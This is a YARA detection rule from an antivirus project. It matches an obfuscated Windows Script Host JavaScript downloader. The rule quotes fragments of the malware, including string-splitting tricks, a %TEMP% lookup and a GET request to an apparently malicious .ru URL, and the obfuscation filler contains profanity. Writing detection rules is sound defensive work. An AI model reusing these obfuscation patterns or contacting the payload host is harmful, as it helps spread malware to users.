rule sig_20160428_36e03ea545a22caa6717adb4bedef2bd {
  meta:
    description = "datamaliciousorder - file 20160428_36e03ea545a22caa6717adb4bedef2bd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d9393fedb406932f06937b98052dbc3b9631cdab8ae4ed0533a5da544b926ae5"

  strings:
    $s1  = "function LjhYmpAhaXvyNzjUsxInp(ZkaVjmQcpWphYbnCygQti){JclFiiChaAvqLqxJmpIyd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function LjhYmpAhaXvyNzjUsxInp(ZkaVjmQcpWphYbnCygQti){JclFiiChaAvqLqxJmpIyd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function EktXxuRmrOpyXxaLbwKlr() {return JclFiiChaAvqLqxJmpIyd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function IznGqcZnwDkfTfkCkvRis(BqnJwjLplQbkVdcVgyJnw, EiyXtaHrwLpdBkyPqdYmz){RrtPhlGieYzcJguQyxZzj = RrtPhlGieYzcJguQyxZzj * 1; " ascii
    $s5  = "return BqnJwjLplQbkVdcVgyJnw - EiyXtaHrwLpdBkyPqdYmz;};" fullword ascii
    $s6  = "var JclFiiChaAvqLqxJmpIyd = function HrzKdrDndEseGjhXxaGgj() {return NjoZjoYwvMdyMikUxiGgx[RtoJzpNwcQucRymAqvVps](\"WScript\"+\"" ascii
    $s7  = "var JclFiiChaAvqLqxJmpIyd = function HrzKdrDndEseGjhXxaGgj() {return NjoZjoYwvMdyMikUxiGgx[RtoJzpNwcQucRymAqvVps](\"WScript\"+\"" ascii
    $s8  = "var NjoZjoYwvMdyMikUxiGgx = this[\"WScript\"];" fullword ascii
    $s9  = "function EktXxuRmrOpyXxaLbwKlr() {return JclFiiChaAvqLqxJmpIyd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function IznGqcZnwDkfTfkCkvRis(BqnJwjLplQbkVdcVgyJnw, EiyXtaHrwLpdBkyPqdYmz){RrtPhlGieYzcJguQyxZzj = RrtPhlGieYzcJguQyxZzj * 1; " ascii
    $s11 = "if (UlbJcvAbdFzbMahCokMvk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function NlgBjcGwfAweYpdYnnMaz(){return SzsYhaDmmSjdYvqGoyOif + \"\";};" fullword ascii
    $s13 = "UlbJcvAbdFzbMahCokMvk[DkfCrlUesZooVftZlzPfc](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s14 = "function KdyZaoYorIdeUoyRukPjf() {return ((HvqKyaGncVxfLkmSjsUsd == true) && (HvqKyaGncVxfLkmSjsUsd == SkvZpcHqjVooGziPdrOkj)) ?" ascii
    $s15 = "function KdyZaoYorIdeUoyRukPjf() {return ((HvqKyaGncVxfLkmSjsUsd == true) && (HvqKyaGncVxfLkmSjsUsd == SkvZpcHqjVooGziPdrOkj)) ?" ascii
    $s16 = "var HdwYakAitXogMsgFcrKvc = false;" fullword ascii
    $s17 = "SkvZpcHqjVooGziPdrOkj = true; " fullword ascii
    $s18 = "var SpxCjeNtwIpmGodVdeGmg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function YtxSsnYliQraNmzJluFid(){return 23;};" fullword ascii
    $s20 = "var SkvZpcHqjVooGziPdrOkj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}